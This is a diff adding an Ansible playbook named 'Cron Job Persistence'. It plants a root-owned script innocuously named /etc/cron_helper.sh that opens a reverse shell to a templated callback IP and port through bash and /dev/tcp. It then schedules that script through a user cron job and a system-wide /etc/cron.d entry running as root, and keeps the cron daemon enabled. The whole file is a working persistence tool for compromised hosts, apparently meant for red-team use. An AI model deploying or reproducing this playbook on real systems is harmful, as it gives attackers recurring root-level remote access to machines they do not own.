@@ -1,0 +1,53 @@
+# Made by
+# Jason Hyde
+# jth1987@rit.edu
+---
+- name: Cron Job Persistence
+  hosts: targets
+  become: yes
+  gather_facts: no
+
+  vars:
+    cron_user: "{{ ansible_user }}"
+
+  tasks:
+
+    - name: Deploy persistence cron script
+      copy:
+        dest: /etc/cron_helper.sh
+        mode: '0755'
+        owner: root
+        group: root
+        content: |
+          #!/bin/bash
+          # Check if session is already alive before reconnecting
+          if ! pgrep -f "{{ callback_ip }}:{{ callback_port }}" > /dev/null 2>&1; then
+            bash -i >& /dev/tcp/{{ callback_ip }}/{{ callback_port }} 0>&1
+          fi
+
+    - name: Install cron job for current user
+      cron:
+        name: "{{ cron_job_name }}"
+        minute: "{{ cron_interval }}"
+        hour: "*"
+        day: "*"
+        month: "*"
+        weekday: "*"
+        job: "/etc/cron_helper.sh"
+        user: "{{ cron_user }}"
+        state: present
+
+    - name: Also plant in /etc/cron.d for system-wide persistence
+      copy:
+        dest: /etc/cron.d/{{ cron_job_name }}
+        mode: '0644'
+        owner: root
+        group: root
+        content: |
+          {{ cron_interval }} * * * * root /etc/cron_helper.sh
+
+    - name: Ensure cron daemon is running
+      service:
+        name: cron
+        state: started
+        enabled: yes
